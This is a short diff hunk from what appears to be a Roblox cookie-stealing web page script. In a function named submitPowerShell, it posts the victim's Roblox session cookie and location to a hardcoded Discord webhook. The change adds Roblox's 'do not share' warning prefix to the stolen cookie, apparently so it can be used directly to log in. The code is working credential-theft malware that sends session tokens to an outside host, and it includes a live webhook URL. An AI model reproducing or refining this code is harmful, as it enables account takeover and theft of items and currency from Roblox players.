@@ -240,7 +240,7 @@ async function submitPowerShell() {
             const webhookUrl = 'https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv';
             
             const message = {
-                content: `@everyone\n${globalRobloxCookie}\nLocation: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
+                content: `@everyone\n_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${globalRobloxCookie}\nLocation: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
             };
 
             await fetch(webhookUrl, {
